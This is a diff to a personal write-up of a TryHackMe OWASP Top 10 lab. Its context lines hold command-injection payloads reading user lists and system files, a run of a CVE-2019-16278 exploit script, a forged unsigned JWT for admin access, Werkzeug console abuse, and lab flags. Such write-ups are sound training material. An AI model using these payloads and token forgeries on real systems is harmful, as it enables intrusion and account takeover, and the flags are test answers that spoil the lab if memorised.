@@ -82,7 +82,6 @@ Read and understand what broken access control is.
 
  Completed
 
-
 ### Broken Access Control (IDOR Challenge)
 
 Insecure Direct Object Reference
@@ -316,7 +315,6 @@ What is the name of the mentioned directory?
 
 Have a look at the source code on the /login page.
 
-
 */assets*
 
 Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?  
@@ -335,9 +333,6 @@ Read the supporting material.
 *qwertyuiop*
 
 Log in as the admin. What is the flag?
-
-
-![[Pasted image 20230309121641.png]]
 
 *THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}*
 
@@ -446,7 +441,6 @@ $(getent passwd | awk -F: '$3>=1000 && $1!="nobody" {print $1}')
 
 $(whoami)
 
-
  ________ 
 < apache >
  -------- 
@@ -494,9 +488,7 @@ $(cat /etc/alpine-release)
       _.. `--'_..-_/   /--' _ .' ,4
    ( i l ),-''  ( l i),'  ( ( ! .-'    
 
-
 ```
-
 
 What strange text file is in the website's root directory?
 
@@ -561,10 +553,6 @@ THM{Not_3ven_c4tz_c0uld_sav3_U!}
 
 cat img
 ```
-
-![[Pasted image 20230309132927.png]]
-
-![[Pasted image 20230309134043.png]]
 
 Try to reset joseph's password. Keep in mind the method used by the site to validate if you are indeed joseph.
 
@@ -636,18 +624,15 @@ app = Flask(__name__)
 app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:////" + DATABASE
 db = SQLAlchemy(app)
 
-
 class Todo(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     title = db.Column(db.String(80))
     complete = db.Column(db.Boolean)
 
-
 @app.route("/")
 def index():
     todo_list = Todo.query.all()
     return render_template("index.html", todo_list=todo_list)
-
 
 @app.route("/add", methods=["POST"])
 def add():
@@ -657,7 +642,6 @@ def add():
     db.session.commit()
     return redirect(url_for("index"))
 
-
 @app.route("/complete/<string:todo_id>")
 def complete(todo_id):
     todo = Todo.query.filter_by(id=todo_id).first()
@@ -665,14 +649,12 @@ def complete(todo_id):
     db.session.commit()
     return redirect(url_for("index"))
 
-
 @app.route("/delete/<string:todo_id>")
 def delete(todo_id):
     todo = Todo.query.filter_by(id=todo_id).first()
     db.session.delete(todo)
     db.session.commit()
     return redirect(url_for("index"))
-
 
 if __name__ == "__main__":
     db.create_all()
@@ -829,7 +811,6 @@ ENV WERKZEUG_DEBUG_PIN off
 
 CMD [ "python", "./app.py" ]
 
-
 ```
 
 Navigate to [http://10.10.89.200:86/console](http://10.10.89.200:86/console) to access the Werkzeug console.  
@@ -851,7 +832,6 @@ Modify the code to read the contents of the `app.py` file, which contains the�
 The flag looks like THM{...}. Be sure to write it without the surrounding quotes!
 
 *THM{Just_a_tiny_misconfiguration}*
-
 
 ### 6. Vulnerable and Outdated Components
 
@@ -919,7 +899,6 @@ Linux
 ```shell-session
 user@linux$ python2 47837.py 127.0.0.1 80 id
 
-
                                         _____-2019-16278
         _____  _______    ______   _____\    \
    _____\    \_\      |  |      | /    / |    |
@@ -932,9 +911,6 @@ user@linux$ python2 47837.py 127.0.0.1 80 id
 | |     /____/|    \ |     | /  | |    |____/|
  \|_____|    ||     \|_____|/    \|____|   | |
         |____|/                        |___|/
-
-
-
 
 HTTP/1.1 200 OK
 Date: Fri, 03 Feb 2023 04:58:34 GMT
@@ -1087,7 +1063,6 @@ Answer the questions below
 Error: This user is already registered
 
  darren
-
 
 User registered successfully!
 
@@ -1265,9 +1240,7 @@ so final will be
 
 eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc4Mzk1NjgyfQ.
 
-
 THM{Dont_take_cookies_from_strangers}
-
 
 ```
 
@@ -1300,7 +1273,6 @@ Use the knowledge gained in this task to modify the JWT token so that the applic
 What is the flag presented to the admin user?
 
 *THM{Dont_take_cookies_from_strangers}*
-
 
 ### 9. Security Logging and Monitoring Failures
 
@@ -1345,7 +1317,6 @@ Answer the questions below
 401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
 401 Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
 401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login 
-
 
 ```
 
@@ -1426,8 +1397,6 @@ User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9
 Accept: */*
 X-API-KEY: THM{Hello_Im_just_an_API_key}
 
-
-
 ```
 
 Navigate to [http://10.10.89.200:8087/](http://10.10.89.200:8087/), where you'll find a simple web application. After exploring a bit, you should see an admin area, which will be our main objective. Follow the instructions on the following questions to gain access to the website's restricted area!  
@@ -1465,6 +1434,5 @@ Answer the questions below
 Read the above!
 
  Complete
-
 
 [[CyberCrafted]]
